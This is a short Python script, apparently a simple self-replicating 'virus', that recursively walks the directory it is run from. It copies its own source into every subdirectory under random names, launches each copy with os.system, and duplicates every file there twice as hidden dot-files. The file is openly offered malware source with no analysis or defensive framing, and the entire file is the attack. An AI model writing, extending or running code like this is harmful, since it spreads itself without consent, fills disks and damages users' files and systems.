import os
import shutil
import random

class Virus:
    def __init__(self,path=None,target_dir=None,repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
    
    def list_dir(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        for file in current_dir:
            if not file.startswith('.'):
                abs_path = os.path.join(path,file)
                print(abs_path)
                if os.path.isdir(abs_path):
                    self.list_dir(abs_path)
                else:
                    pass
    def New_virus(self):
        for dir in self.target_dir:
            n = random.randint(0,10)
            new_virus = 'Virus'+str(n)+'.py'
            destination = os.path.join(dir,new_virus)
            shutil.copyfile(self.own_path,destination)    
            os.system(new_virus+' 1')

    def replicate(self):
        for dir in self.target_dir:
            filelist_dir = os.listdir(dir)
            for file in filelist_dir:
                abs_path = os.path.join(dir,file) 
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.repeat):
                        destination = os.path.join(dir,('.'+file+str(i)))   
                        shutil.copyfile(source,destination)
                        
    def Virus_action(self):
        self.list_dir(self.path)
        self.New_virus()
        self.replicate()

if __name__ == '__main__':
    current_dir = os.path.abspath('')
    Virus = Virus(path=current_dir)
    Virus.Virus_action()



